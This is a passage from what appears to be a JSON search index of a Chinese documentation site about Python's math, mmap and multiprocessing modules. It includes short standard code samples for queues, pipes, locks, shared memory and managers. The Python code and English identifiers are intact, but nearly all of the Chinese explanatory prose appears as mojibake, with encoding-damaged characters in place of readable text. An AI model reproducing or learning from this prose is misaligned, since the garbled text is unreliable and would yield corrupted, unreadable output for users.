è¿”å›å®ƒä»¬çš„ç¬¬äºŒä¸ªè¿”å›å‚æ•°ï¼ˆPythonä¸­æ²¡æœ‰è¿™æ ·çš„ä¸œè¥¿ï¼‰ã€‚ å¯¹äº ceil() ï¼Œ floor() å’Œ modf() å‡½æ•°ï¼Œè¯·æ³¨æ„ æ‰€æœ‰ è¶³å¤Ÿå¤§çš„æµ®ç‚¹æ•°éƒ½æ˜¯ç²¾ç¡®æ•´æ•°ã€‚ Pythonæµ®ç‚¹æ•°é€šå¸¸ä¸è¶…è¿‡53ä½çš„ç²¾åº¦ï¼ˆä¸å¹³å°C doubleç±»å‹ç›¸åŒï¼‰ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»»ä½•æµ®ç‚¹ x ä¸ abs(x) >= 2**52 å¿…ç„¶æ²¡æœ‰å°æ•°ä½ã€‚ å¹‚å‡½æ•°ä¸å¯¹æ•°å‡½æ•° ä¸‰è§’å‡½æ•° è§’åº¦è½¬æ¢ åŒæ›²å‡½æ•° åŒæ›²å‡½æ•° æ˜¯åŸºäºåŒæ›²çº¿è€Œéåœ†æ¥å¯¹ä¸‰è§’å‡½æ•°è¿›è¡Œæ¨¡æ‹Ÿã€‚ ç‰¹æ®Šå‡½æ•° å¸¸é‡ math.pi: æ•°å­¦å¸¸æ•° Ï€ = 3.141592...ï¼Œç²¾ç¡®åˆ°å¯ç”¨ç²¾åº¦ã€‚ math.e: æ•°å­¦å¸¸æ•° e = 2.718281...ï¼Œç²¾ç¡®åˆ°å¯ç”¨ç²¾åº¦ã€‚ math.tau: æ•°å­¦å¸¸æ•° Ï„ = 6.283185...ï¼Œç²¾ç¡®åˆ°å¯ç”¨ç²¾åº¦ã€‚ Tau æ˜¯ä¸€ä¸ªåœ†å‘¨å¸¸æ•°ï¼Œç­‰äº 2Ï€ï¼Œåœ†çš„å‘¨é•¿ä¸åŠå¾„ä¹‹æ¯”ã€‚ æ›´å¤šå…³äº Tau çš„ä¿¡æ¯å¯å‚è€ƒ Vi Hart çš„è§†é¢‘ Pi is (still) Wrongã€‚åƒä¸¤å€å¤šçš„æ´¾æ¥åº†ç¥ Tau æ—¥ å§ï¼ 3.6 æ–°ç‰ˆåŠŸèƒ½. math.inf: æµ®ç‚¹æ­£æ— ç©·å¤§ã€‚ ï¼ˆå¯¹äºè´Ÿæ— ç©·å¤§ï¼Œä½¿ç”¨ -math.inf ã€‚ï¼‰ç›¸å½“äº float('inf') çš„è¾“å‡ºã€‚ 3.5 æ–°ç‰ˆåŠŸèƒ½. math.nan: ä¸€ä¸ªæµ®ç‚¹çš„ \"éæ•°å­—\"ï¼ˆNaNï¼‰å€¼ã€‚ç›¸å½“äº float('nan') çš„è¾“å‡ºã€‚ ç”±äº IEEE-754æ ‡å‡† çš„è¦æ±‚ï¼Œ math.nan å’Œ float('nan') ä¸è¢«è®¤ä¸ºç­‰äºä»»ä½•å…¶ä»–æ•°å€¼ï¼ŒåŒ…æ‹¬å…¶æœ¬èº«ã€‚ è¦æ£€æŸ¥ä¸€ä¸ªæ•°å­—æ˜¯å¦ä¸ºNaNï¼Œè¯·ä½¿ç”¨ isnan() å‡½æ•°æ¥æµ‹è¯• NaN ï¼Œè€Œä¸æ˜¯ is æˆ– == ã€‚ ä¾‹å­: >>> import math math.nan == math.nan False float('nan') == float('nan') False math.isnan(math.nan) True math.isnan(float('nan')) True åœ¨ 3.11 ç‰ˆæ›´æ”¹: It is now always available. 3.5 æ–°ç‰ˆåŠŸèƒ½. CPython å®ç°ç»†èŠ‚ math æ¨¡å—ä¸»è¦åŒ…å«å›´ç»•å¹³å°Cæ•°å­¦åº“å‡½æ•°çš„ç®€å•åŒ…è£…å™¨ã€‚ ç‰¹æ®Šæƒ…å†µä¸‹çš„è¡Œä¸ºåœ¨é€‚å½“æƒ…å†µä¸‹éµå¾ªC99æ ‡å‡†çš„é™„å½•Fã€‚ å½“å‰çš„å®ç°å°†å¼•å‘ ValueError ç”¨äºæ— æ•ˆæ“ä½œï¼Œå¦‚ sqrt(-1.0) æˆ– log(0.0) ï¼ˆå…¶ä¸­C99é™„ä»¶Få»ºè®®å‘å‡ºæ— æ•ˆæ“ä½œä¿¡å·æˆ–è¢«é›¶é™¤ï¼‰ï¼Œ å’Œ OverflowError ç”¨äºæº¢å‡ºçš„ç»“æœï¼ˆä¾‹å¦‚ï¼Œ exp(1000.0) ï¼‰ã€‚ é™¤éä¸€ä¸ªæˆ–å¤šä¸ªè¾“å…¥å‚æ•°æ˜¯NaNï¼Œå¦åˆ™ä¸ä¼šä»ä¸Šè¿°ä»»ä½•å‡½æ•°è¿”å›NaNï¼› åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¤§å¤šæ•°å‡½æ•°å°†è¿”å›ä¸€ä¸ªNaNï¼Œä½†æ˜¯ï¼ˆå†æ¬¡éµå¾ªC99é™„ä»¶Fï¼‰è¿™ä¸ªè§„åˆ™æœ‰ä¸€äº›ä¾‹å¤–ï¼Œ ä¾‹å¦‚ pow(float('nan'), 0.0) æˆ– hypot(float('nan'), float('inf')) ã€‚ è¯·æ³¨æ„ï¼ŒPythonä¸ä¼šå°†æ˜¾å¼NaNä¸é™é»˜NaNåŒºåˆ†å¼€æ¥ï¼Œå¹¶ä¸”æ˜¾å¼NaNçš„è¡Œä¸ºä»æœªæ˜ç¡®ã€‚å…¸å‹çš„è¡Œä¸ºæ˜¯å°†æ‰€æœ‰NaNè§†ä¸ºé™é»˜çš„ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-math.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-math.html"},{"title":"mmap","text":"å®˜ç½‘æ–‡æ¡£:: mmap - å†…å­˜æ˜ å°„æ–‡ä»¶æ”¯æŒ éƒ¨åˆ†å‚è€ƒ:: Pythonå¤šè¿›ç¨‹ï¼ˆ2ï¼‰â€”â€”mmapæ¨¡å—ä¸mmapå¯¹è±¡ åˆ›å»ºå†…å­˜æ˜ å°„çš„æ–‡ä»¶å¯¹è±¡. ç±»ä¼¼äºfileæ‰“å¼€çš„æ–‡ä»¶å¯¹è±¡çš„æ“ä½œ, åŒæ—¶åˆæ”¯æŒäº†å­—èŠ‚æ•°ç»„çš„ä¸€äº›æ“ä½œå¦‚åˆ‡ç‰‡. é€šä¿—æ¥è¯´å°±æ˜¯åˆ›å»ºä¸€ä¸ªå­˜åœ¨äºå†…å­˜çš„æ–‡ä»¶(ä¸ªäººè§‚ç‚¹). ä¸ string çš„åŒºåˆ«æ˜¯: mmap å¯¹è±¡ä¸æä¾›å­—ç¬¦ä¸²å¯¹è±¡çš„æ–¹æ³•ï¼› mmap å¯¹è±¡æ˜¯å¯å˜çš„, è€Œ str å¯¹è±¡æ˜¯ä¸å¯å˜çš„ mmap å¯¹è±¡åŒæ—¶å¯¹åº”äºæ‰“å¼€çš„æ–‡ä»¶, å¤šæ€äºä¸€ä¸ªPython file å¯¹è±¡ mmap å¯¹è±¡å¯ä»¥åˆ‡ç‰‡å’Œç´¢å¼•, ä¹Ÿå¯ä»¥ä¸ºå®ƒçš„åˆ‡ç‰‡æˆ–ç´¢å¼•èµ‹å€¼ï¼ˆå› ä¸º mmap å¯¹è±¡æ˜¯å¯å˜çš„ï¼‰, ä¸º mmap å¯¹è±¡çš„åˆ‡ç‰‡èµ‹å€¼æ—¶, èµ‹å€¼è¯­å¥å³å€¼çš„é•¿åº¦å¿…é¡»å’Œå·¦å€¼åˆ‡ç‰‡çš„é•¿åº¦ç›¸åŒ. mmap å¯¹è±¡å¯ä»¥ä½œä¸ºè¿›ç¨‹é—´é€šè¿‡æ–‡ä»¶è¿›è¡Œ IPC çš„ä¸€ç§æ›¿æ¢æ‰‹æ®µ. mmapç±» å®šä¹‰ windowsç‰ˆæœ¬ unixç‰ˆæœ¬ å‚æ•° fileno: æ–‡ä»¶æè¿°ç¬¦(å¥æŸ„), å¯ä»¥æ˜¯ -1 è¿™ç§, ä¹Ÿå¯ä»¥ open().fileno() length: int å°†æŒ‡å®š fileno çš„å‰ length å­—èŠ‚æ˜ å°„åˆ°å†…å­˜. æ˜ å°„çš„å†…å®¹å­—èŠ‚é•¿åº¦, ä¸º0åˆ™è¡¨ç¤ºæ˜ å°„æ•´ä¸ªæ–‡ä»¶. å¦‚æœ length å¤§äºå½“å‰æ–‡ä»¶å¤§å°, åˆ™æ–‡ä»¶å°†æ‰©å±•ä¸ºåŒ…å« length ä¸ªå­—èŠ‚. å¦‚æœ length ä¸º 0, åˆ™æ˜ å°„çš„æœ€å¤§é•¿åº¦ä¸ºå½“å‰æ–‡ä»¶å¤§å°. å¦‚æœæ–‡ä»¶ä¸ºç©º, Windows ä¼šå¼•å‘å¼‚å¸¸ï¼ˆä½ æ— æ³•åœ¨Windowsä¸Šåˆ›å»ºç©ºæ˜ å°„ï¼‰. tagname=None platform: windows . å¦‚æœ tagname è¢«æŒ‡å®šä¸”ä¸æ˜¯ None , åˆ™æ˜¯ä¸ºæ˜ å°„æä¾›æ ‡ç­¾åç§°çš„å­—ç¬¦ä¸²(ä¸ºä¸€æ®µå†…å­˜æ˜ å°„æŒ‡å®šåç§°). Windows å…è®¸ä½ å¯¹åŒä¸€æ–‡ä»¶æ‹¥æœ‰è®¸å¤šä¸åŒçš„æ˜ å°„(ä¸€ä¸ªæ–‡ä»¶ä¸Šé¢å¯ä»¥åŒæ—¶å…·æœ‰å¤šä¸ª mmap). å¦‚æœæŒ‡å®šç°æœ‰æ ‡ç­¾çš„åç§°, åˆ™ä¼šæ‰“å¼€è¯¥æ ‡ç­¾, å¦åˆ™å°†åˆ›å»ºè¯¥åç§°çš„æ–°æ ‡ç­¾. å¦‚æœçœç•¥æ­¤å‚æ•°æˆ–è®¾ç½®ä¸º None , åˆ™åˆ›å»ºçš„æ˜ å°„ä¸å¸¦åç§°. é¿å…ä½¿ç”¨ tag å‚æ•°å°†æœ‰åŠ©äºä½¿ä»£ç åœ¨Unixå’ŒWindowsä¹‹é—´å¯ç§»æ¤. flags=MAP_SHARED platform: unix . flags æŒ‡æ˜æ˜ å°„çš„æ€§è´¨. MAP_PRIVATE ä¼šåˆ›å»ºç§æœ‰çš„å†™å…¥æ—¶æ‹·è´æ˜ å°„, å› æ­¤å¯¹ mmap å¯¹è±¡å†…å®¹çš„ä¿®æ”¹å°†ä¸ºè¯¥è¿›ç¨‹æ‰€ç§æœ‰. MAP_SHARED ä¼šåˆ›å»ºä¸å…¶ä»–æ˜ å°„åŒä¸€æ–‡ä»¶åŒºåŸŸçš„è¿›ç¨‹æ‰€å…±äº«çš„æ˜ å°„. é»˜è®¤å€¼ä¸º MAP_SHARED. prot=PROT_WRITE|PROT_READ platform: unix . å¦‚æœæŒ‡æ˜äº† prot, å®ƒå°†ç»™å‡ºæ‰€éœ€çš„å†…å­˜ä¿æŠ¤æ–¹å¼ï¼› æœ€æœ‰ç”¨çš„ä¸¤ä¸ªå€¼æ˜¯ PROT_READ å’Œ PROT_WRITE, åˆ†åˆ«æŒ‡æ˜é¡µé¢ä¸ºå¯è¯»æˆ–å¯å†™. prot é»˜è®¤ä¸º PROT_READ | PROT_WRITE (å¯è¯»å¯å†™). access=ACCESS_DEFAULT[, offset]) åœ¨unixä¸‹, å¯ä»¥æŒ‡å®š access ä½œä¸ºæ›¿ä»£ flags å’Œ prot çš„å¯é€‰å…³é”®å­—å½¢å‚. åŒæ—¶æŒ‡å®š flags, prot å’Œ access å°†å¯¼è‡´é”™è¯¯. å¯¹äºæ‰€æœ‰å¹³å°: å¯ä»¥å°† access æŒ‡å®šä¸ºå¯é€‰çš„å…³é”®å­—å‚æ•°. access æ¥å—ä»¥ä¸‹å››ä¸ªå€¼ä¹‹ä¸€: ACCESS_READ æŒ‡å®šåªè¯». å‘ ACCESS_READ å†…å­˜æ˜ å°„èµ‹å€¼ä¼šå¼•å‘ TypeError å¼‚å¸¸. ACCESS_WRITE æŒ‡å®šåªå†™. å‘ ACCESS_WRITE å†…å­˜æ˜ å°„èµ‹å€¼ä¼šå½±å“å†…å­˜å’Œåº•å±‚çš„æ–‡ä»¶. ACCESS_COPY æŒ‡å®šå†™æ—¶å¤åˆ¶å†…å­˜. å‘ ACCESS_COPY å†…å­˜æ˜ å°„èµ‹å€¼ä¼šå½±å“å†…å­˜, ä½†ä¸ä¼šæ›´æ–°åº•å±‚çš„æ–‡ä»¶. ACCESS_DEFAULT æ¨è¿Ÿåˆ° prot access å¯ä»¥åœ¨ Unix å’Œ Windows ä¸Šä½¿ç”¨. å¦‚æœæœªæŒ‡å®š access , åˆ™ Windows mmap è¿”å›åªå†™æ˜ å°„. è¿™ä¸‰ç§è®¿é—®ç±»å‹çš„åˆå§‹å†…å­˜å€¼å‡å–è‡ªæŒ‡å®šçš„æ–‡ä»¶. offset å¯ä»¥è¢«æŒ‡å®šä¸ºéè´Ÿæ•´æ•°åç§»é‡. mmap å¼•ç”¨å°†ç›¸å¯¹äºä»æ–‡ä»¶å¼€å¤´çš„åç§». offset é»˜è®¤ä¸º0. offeset å¿…é¡»æ˜¯ ALLOCATIONGRANULARITY çš„å€æ•°. æ³¨æ„: åˆ›å»º mmap å°†ä¼šå¼•å‘ä¸€ä¸ª å®¡è®¡äº‹ä»¶ mmap.__new__ é™„å¸¦å‚æ•° fileno, length, access, offset. mmap å¯¹è±¡çš„æ–¹æ³• å¯¹äºEOFçš„å¤„ç†, write() å’Œ read_byte() æŠ›å‡ºå¼‚å¸¸ ValueError, è€Œ write_byte() å’Œ read() ä»€ä¹ˆéƒ½ä¸åš.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-mmap.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-mmap.html"},{"title":"multiprocessing","text":"å®˜ç½‘æ–‡æ¡£:: multiprocessing Pythonä¸­å¤šè¿›ç¨‹æ˜¯ç›¸äº’æ‰§è¡Œäº’ä¸å¹²æ‰°çš„ï¼Œä½†æ˜¯å¦‚æœå¤šè¿›ç¨‹ä¹‹é—´éœ€è¦å¯¹åŒä¸€èµ„æºå¯¹è±¡è¿›è¡Œæ“ä½œæˆ–è€…å¤šä¸ªè¿›ç¨‹ä¹‹é—´æœ‰ç›¸äº’ä¾èµ–çš„ï¼Œ é‚£å°±éœ€è¦ä¸€ä¸ªå…±äº«å˜é‡ä¾›å¤šè¿›ç¨‹ä½¿ç”¨ã€‚ Python multiprocessing å¤šè¿›ç¨‹ä¹‹é—´ç›¸äº’åè°ƒçš„æ–¹å¼æœ‰å¦‚ä¸‹å‡ ç§: Lock: é” Queue: é˜Ÿåˆ— Semaphore: ä¿¡å·é‡ Event: äº‹ä»¶ Pipe: ç®¡é“ Process æ”¯æŒä¸‰ç§å¯åŠ¨è¿›ç¨‹çš„æ–¹æ³• spawn çˆ¶è¿›ç¨‹å¯åŠ¨ä¸€ä¸ªæ–°çš„Pythonè§£é‡Šå™¨è¿›ç¨‹ã€‚ å­è¿›ç¨‹å°†åªç»§æ‰¿è¿è¡ŒProcesså¯¹è±¡çš„run()æ–¹æ³•æ‰€éœ€çš„èµ„æºã€‚ ä¸ä¼šç»§æ‰¿æ¥è‡ªçˆ¶è¿›ç¨‹çš„ä¸å¿…è¦çš„æ–‡ä»¶æè¿°ç¬¦å’Œå¥æŸ„ã€‚ä¸ä½¿ç”¨forkæˆ–forkserverç›¸æ¯”ï¼Œä½¿ç”¨æ­¤æ–¹æ³•å¯åŠ¨è¿›ç¨‹ç›¸å½“æ…¢ã€‚ å¯åœ¨ Unix å’Œ Windows ä¸Šä½¿ç”¨ã€‚ Windows å’Œ macOS ä¸Šçš„é»˜è®¤è®¾ç½®ã€‚ fork çˆ¶è¿›ç¨‹ä½¿ç”¨ os.fork() æ¥äº§ç”Ÿ Python è§£é‡Šå™¨åˆ†å‰ã€‚å­è¿›ç¨‹åœ¨å¼€å§‹æ—¶å®é™…ä¸Šä¸çˆ¶è¿›ç¨‹ç›¸åŒã€‚çˆ¶è¿›ç¨‹çš„æ‰€æœ‰èµ„æºéƒ½ç”±å­è¿›ç¨‹ç»§æ‰¿ã€‚è¯·æ³¨æ„ï¼Œå®‰å…¨åˆ†å‰å¤šçº¿ç¨‹è¿›ç¨‹æ˜¯æ£˜æ‰‹çš„ã€‚ åªå­˜åœ¨äº Unixã€‚ Unix ä¸­çš„é»˜è®¤å€¼ã€‚ forkserver ç¨‹åºå¯åŠ¨å¹¶é€‰æ‹© forkserver å¯åŠ¨æ–¹æ³•æ—¶ï¼Œå°†å¯åŠ¨æœåŠ¡å™¨è¿›ç¨‹ã€‚ ä»é‚£æ—¶èµ·ï¼Œæ¯å½“éœ€è¦ä¸€ä¸ªæ–°è¿›ç¨‹æ—¶ï¼Œçˆ¶è¿›ç¨‹å°±ä¼šè¿æ¥åˆ°æœåŠ¡å™¨å¹¶è¯·æ±‚å®ƒåˆ†å‰ä¸€ä¸ªæ–°è¿›ç¨‹ã€‚ åˆ†å‰æœåŠ¡å™¨è¿›ç¨‹æ˜¯å•çº¿ç¨‹çš„ï¼Œå› æ­¤ä½¿ç”¨ os.fork() æ˜¯å®‰å…¨çš„ã€‚ æ²¡æœ‰ä¸å¿…è¦çš„èµ„æºè¢«ç»§æ‰¿ã€‚ å¯åœ¨Unixå¹³å°ä¸Šä½¿ç”¨ï¼Œæ”¯æŒé€šè¿‡Unixç®¡é“ä¼ é€’æ–‡ä»¶æè¿°ç¬¦ã€‚ å¦‚è¦æ›´æ”¹, åœ¨æ‰§è¡Œä¹‹å‰ä½¿ç”¨: import multiprocessing as mp mp.set_start_method('spawn') è¿›ç¨‹ä¹‹é—´äº¤æ¢å¯¹è±¡ multiprocessing æ”¯æŒè¿›ç¨‹ä¹‹é—´çš„ä¸¤ç§é€šä¿¡é€šé“ï¼š é˜Ÿåˆ— ç®¡é“ é˜Ÿåˆ— Queue ç±»æ˜¯ä¸€ä¸ªè¿‘ä¼¼ queue.Queue çš„å…‹éš†ã€‚ ä¾‹å¦‚: from multiprocessing import Process, Queue def f(q): q.put([42, None, 'hello']) if __name__ == '__main__': q = Queue() p = Process(target=f, args=(q,)) p.start() print(q.get()) # prints \"[42, None, 'hello']\" p.join() é˜Ÿåˆ—æ˜¯çº¿ç¨‹å’Œè¿›ç¨‹å®‰å…¨çš„ã€‚ ç®¡é“ Pipe() å‡½æ•°è¿”å›ä¸€ä¸ªç”±ç®¡é“è¿æ¥çš„è¿æ¥å¯¹è±¡ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯åŒå·¥ï¼ˆåŒå‘ï¼‰ã€‚ä¾‹å¦‚: from multiprocessing import Process, Pipe def f(conn): conn.send([42, None, 'hello']) conn.close() if __name__ == '__main__': parent_conn, child_conn = Pipe() p = Process(target=f, args=(child_conn,)) p.start() print(parent_conn.recv()) # prints \"[42, None, 'hello']\" p.join() è¿”å›çš„ä¸¤ä¸ªè¿æ¥å¯¹è±¡ Pipe() è¡¨ç¤ºç®¡é“çš„ä¸¤ç«¯ã€‚æ¯ä¸ªè¿æ¥å¯¹è±¡éƒ½æœ‰ send() å’Œ recv() æ–¹æ³•ï¼ˆç›¸äº’ä¹‹é—´çš„ï¼‰ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœä¸¤ä¸ªè¿›ç¨‹ï¼ˆæˆ–çº¿ç¨‹ï¼‰åŒæ—¶å°è¯•è¯»å–æˆ–å†™å…¥ç®¡é“çš„ åŒä¸€ ç«¯ï¼Œåˆ™ç®¡é“ä¸­çš„æ•°æ®å¯èƒ½ä¼šæŸåã€‚å½“ç„¶ï¼Œåœ¨ä¸åŒè¿›ç¨‹ä¸­åŒæ—¶ä½¿ç”¨ç®¡é“çš„ä¸åŒç«¯çš„æƒ…å†µä¸‹ä¸å­˜åœ¨æŸåçš„é£é™©ã€‚ è¿›ç¨‹é—´åŒæ­¥ multiprocessing åŒ…å«æ¥è‡ª threading çš„æ‰€æœ‰åŒæ­¥åŸè¯­çš„ç­‰ä»·ç‰©ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨é”æ¥ç¡®ä¿ä¸€æ¬¡åªæœ‰ä¸€ä¸ªè¿›ç¨‹æ‰“å°åˆ°æ ‡å‡†è¾“å‡º: from multiprocessing import Process, Lock def f(l, i): l.acquire() try: print('hello world', i) finally: l.release() if __name__ == '__main__': lock = Lock() for num in range(10): Process(target=f, args=(lock, num)).start() ä¸ä½¿ç”¨é”çš„æƒ…å†µä¸‹ï¼Œæ¥è‡ªäºå¤šè¿›ç¨‹çš„è¾“å‡ºå¾ˆå®¹æ˜“äº§ç”Ÿæ··æ·†ã€‚ è¿›ç¨‹é—´å…±äº«çŠ¶æ€ å¦‚ä¸Šæ‰€è¿°ï¼Œåœ¨è¿›è¡Œå¹¶å‘ç¼–ç¨‹æ—¶ï¼Œé€šå¸¸æœ€å¥½å°½é‡é¿å…ä½¿ç”¨å…±äº«çŠ¶æ€ã€‚ä½¿ç”¨å¤šä¸ªè¿›ç¨‹æ—¶å°¤å…¶å¦‚æ­¤ã€‚ ä½†æ˜¯ï¼Œå¦‚æœä½ çœŸçš„éœ€è¦ä½¿ç”¨ä¸€äº›å…±äº«æ•°æ®ï¼Œé‚£ä¹ˆ multiprocessing æä¾›äº†ä¸¤ç§æ–¹æ³•ã€‚ å…±äº«å†…å­˜ å¯ä»¥ä½¿ç”¨ Value æˆ– Array å°†æ•°æ®å­˜å‚¨åœ¨å…±äº«å†…å­˜æ˜ å°„ä¸­ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹ä»£ç : from multiprocessing import Process, Value, Array def f(n, a): n.value = 3.1415927 for i in range(len(a)): a[i] = -a[i] if __name__ == '__main__': num = Value('d', 0.0) arr = Array('i', range(10)) p = Process(target=f, args=(num, arr)) p.start() p.join() print(num.value) print(arr[:]) å°†æ‰“å°: 3.1415927 [0, -1, -2, -3, -4, -5, -6, -7, -8, -9] åˆ›å»º num å’Œ arr æ—¶ä½¿ç”¨çš„ 'd' å’Œ 'i' å‚æ•°æ˜¯ array æ¨¡å—ä½¿ç”¨çš„ç±»å‹çš„ typecode ï¼š 'd' è¡¨ç¤ºåŒç²¾åº¦æµ®ç‚¹æ•°ï¼Œ 'i' è¡¨ç¤ºæœ‰ç¬¦å·æ•´æ•°ã€‚è¿™äº›å…±äº«å¯¹è±¡å°†æ˜¯è¿›ç¨‹å’Œçº¿ç¨‹å®‰å…¨çš„ã€‚ ä¸ºäº†æ›´çµæ´»åœ°ä½¿ç”¨å…±äº«å†…å­˜ï¼Œå¯ä»¥ä½¿ç”¨ multiprocessing.sharedctypes æ¨¡å—ï¼Œè¯¥æ¨¡å—æ”¯æŒåˆ›å»ºä»å…±äº«å†…å­˜åˆ†é…çš„ä»»æ„ctypeså¯¹è±¡ã€‚ æœåŠ¡è¿›ç¨‹ ç”± Manager() è¿”å›çš„ç®¡ç†å™¨å¯¹è±¡æ§åˆ¶ä¸€ä¸ªæœåŠ¡è¿›ç¨‹ï¼Œè¯¥è¿›ç¨‹ä¿å­˜Pythonå¯¹è±¡å¹¶å…è®¸å…¶ä»–è¿›ç¨‹ä½¿ç”¨ä»£ç†æ“ä½œå®ƒä»¬ã€‚ Manager() è¿”å›çš„ç®¡ç†å™¨æ”¯æŒç±»å‹: list dict Namespace Lock RLock Semaphore BoundedSemaphore Condition Event Barrier Queue Value Array ä¾‹å¦‚: from multiprocessing import Process, Manager def f(d, l): d[1] = '1' d['2'] = 2 d[0.25] = None l.reverse() if __name__ == '__main__': with Manager() as manager: d = manager.dict() l = manager.list(range(10)) p = Process(target=f, args=(d, l)) p.start() p.join() print(d) print(l) å°†æ‰“å°: {0.25: None, 1: '1', '2': 2} [9, 8, 7, 6, 5, 4, 3, 2, 1, 0] ä½¿ç”¨æœåŠ¡è¿›ç¨‹çš„ç®¡ç†å™¨æ¯”ä½¿ç”¨å…±äº«å†…å­˜å¯¹è±¡æ›´çµæ´»ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥æ”¯æŒä»»æ„å¯¹è±¡ç±»å‹ã€‚ æ­¤å¤–ï¼Œå•ä¸ªç®¡ç†å™¨å¯ä»¥é€šè¿‡ç½‘ç»œç”±ä¸åŒè®¡ç®—æœºä¸Šçš„è¿›ç¨‹å…±äº«ã€‚ä½†æ˜¯ï¼Œå®ƒä»¬æ¯”ä½¿ç”¨å…±äº«å†…å­˜æ…¢ã€‚ ä½¿ç”¨å·¥ä½œè¿›ç¨‹ Processå¯¹è±¡çš„ä¸€äº›å±æ€§/æ–¹æ³• start() å¯åŠ¨è¿›ç¨‹æ´»åŠ¨ã€‚ è¿™ä¸ªæ–¹æ³•æ¯ä¸ªè¿›ç¨‹å¯¹è±¡æœ€å¤šåªèƒ½è°ƒç”¨ä¸€æ¬¡ã€‚å®ƒä¼šå°†å¯¹è±¡çš„ run() æ–¹æ³•å®‰æ’åœ¨ä¸€ä¸ªå•ç‹¬çš„è¿›ç¨‹ä¸­è°ƒç”¨ã€‚ join([timeout]) å¦‚æœå¯é€‰å‚æ•° timeout æ˜¯ None ï¼ˆé»˜è®¤å€¼ï¼‰ï¼Œåˆ™è¯¥æ–¹æ³•å°†é˜»å¡ï¼Œç›´åˆ°è°ƒç”¨ join() æ–¹æ³•çš„è¿›ç¨‹ç»ˆæ­¢ã€‚å¦‚æœ timeout æ˜¯ä¸€ä¸ªæ­£æ•°ï¼Œå®ƒæœ€å¤šä¼šé˜»å¡ timeout ç§’ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœè¿›ç¨‹ç»ˆæ­¢æˆ–æ–¹æ³•è¶…æ—¶ï¼Œåˆ™è¯¥æ–¹æ³•è¿”å› None ã€‚æ£€æŸ¥è¿›ç¨‹çš„ exitcode ä»¥ç¡®å®šå®ƒæ˜¯å¦ç»ˆæ­¢ã€‚ ä¸€ä¸ªè¿›ç¨‹å¯ä»¥è¢« join å¤šæ¬¡ã€‚ è¿›ç¨‹æ— æ³•joinè‡ªèº«ï¼Œå› ä¸ºè¿™ä¼šå¯¼è‡´æ­»é”ã€‚å°è¯•åœ¨å¯åŠ¨è¿›ç¨‹ä¹‹å‰joinè¿›ç¨‹æ˜¯é”™è¯¯çš„ã€‚ name è¿›ç¨‹çš„åç§°ã€‚è¯¥åç§°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»…ç”¨äºè¯†åˆ«ç›®çš„ã€‚å®ƒæ²¡æœ‰è¯­ä¹‰ã€‚å¯ä»¥ä¸ºå¤šä¸ªè¿›ç¨‹æŒ‡å®šç›¸åŒçš„åç§°ã€‚ åˆå§‹åç§°ç”±æ„é€ å™¨è®¾å®šã€‚ å¦‚æœæ²¡æœ‰ä¸ºæ„é€ å™¨æä¾›æ˜¾å¼åç§°ï¼Œåˆ™ä¼šæ„é€ ä¸€ä¸ªå½¢å¼ä¸º 'Process-N1:N2:...:Nk' çš„åç§°ï¼Œå…¶ä¸­æ¯ä¸ª Nk æ˜¯å…¶çˆ¶äº²çš„ç¬¬ N ä¸ªå­©å­ã€‚ is_alive() è¿”å›è¿›ç¨‹æ˜¯å¦è¿˜æ´»ç€ã€‚ ç²—ç•¥åœ°è¯´ï¼Œä» start() æ–¹æ³•è¿”å›åˆ°å­è¿›ç¨‹ç»ˆæ­¢ä¹‹å‰ï¼Œè¿›ç¨‹å¯¹è±¡ä»å¤„äºæ´»åŠ¨çŠ¶æ€ã€‚ daemon è¿›ç¨‹çš„å®ˆæŠ¤æ ‡å¿—ï¼Œä¸€ä¸ªå¸ƒå°”å€¼ã€‚è¿™å¿…é¡»åœ¨ start() è¢«è°ƒç”¨ä¹‹å‰è®¾ç½®ã€‚ åˆå§‹å€¼ç»§æ‰¿è‡ªåˆ›å»ºè¿›ç¨‹ã€‚ å½“è¿›ç¨‹é€€å‡ºæ—¶ï¼Œå®ƒä¼šå°è¯•ç»ˆæ­¢å…¶æ‰€æœ‰å®ˆæŠ¤è¿›ç¨‹å­è¿›ç¨‹ã€‚ è¯·æ³¨æ„ï¼Œä¸å…è®¸åœ¨å®ˆæŠ¤è¿›ç¨‹ä¸­åˆ›å»ºå­è¿›ç¨‹ã€‚è¿™æ˜¯å› ä¸ºå½“å®ˆæŠ¤è¿›ç¨‹ç”±äºçˆ¶è¿›ç¨‹é€€å‡ºè€Œä¸­æ–­æ—¶ï¼Œå…¶å­è¿›ç¨‹ä¼šå˜æˆå­¤å„¿è¿›ç¨‹ã€‚ å¦å¤–ï¼Œè¿™äº› ä¸æ˜¯ Unix å®ˆæŠ¤è¿›ç¨‹æˆ–æœåŠ¡ï¼Œå®ƒä»¬æ˜¯æ­£å¸¸è¿›ç¨‹ï¼Œå¦‚æœéå®ˆæŠ¤è¿›ç¨‹å·²ç»é€€å‡ºï¼Œå®ƒä»¬å°†è¢«ç»ˆæ­¢ï¼ˆå¹¶ä¸”ä¸è¢«åˆå¹¶ï¼‰ã€‚ pid è¿”å›è¿›ç¨‹IDã€‚åœ¨ç”Ÿæˆè¯¥è¿›ç¨‹ä¹‹å‰ï¼Œè¿™å°†æ˜¯ None ã€‚ exitcode å­è¿›ç¨‹çš„é€€å‡ºä»£ç ã€‚å¦‚æœè¯¥è¿›ç¨‹å°šæœªç»ˆæ­¢åˆ™ä¸º None ã€‚ å¦‚æœå­è¿›ç¨‹çš„ run() æ–¹æ³•æ­£å¸¸è¿”å›ï¼Œé€€å‡ºä»£ç å°†æ˜¯ 0 ã€‚ å¦‚æœå®ƒé€šè¿‡ sys.exit() ç»ˆæ­¢ï¼Œå¹¶æœ‰ä¸€ä¸ªæ•´æ•°å‚æ•° N ï¼Œé€€å‡ºä»£ç å°†æ˜¯ N ã€‚ 